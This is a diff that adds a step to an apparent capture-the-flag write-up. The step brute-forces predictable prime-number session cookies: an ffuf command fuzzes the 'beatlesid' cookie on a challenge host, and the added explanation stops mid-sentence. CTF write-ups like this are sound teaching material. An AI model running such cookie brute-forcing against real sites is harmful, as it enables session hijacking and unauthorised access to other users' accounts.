@@ -16,6 +16,11 @@ Since we are working on multiple user-logins and already have access to 3 of the
 
 Immediately we can tell that the id's are prime numbers, which led me to brute force the cookie id's with all prime numbers between 11161 and 15803 using **fuff**
 
+```
+ffuf -u "http://vader.hackingarena.com:825/index.php" -b "beatlesid=FUZZ" -w "Desktop/primes" -fs 543
+```
+
+This allows us to check 
 
 # Additional Info
 
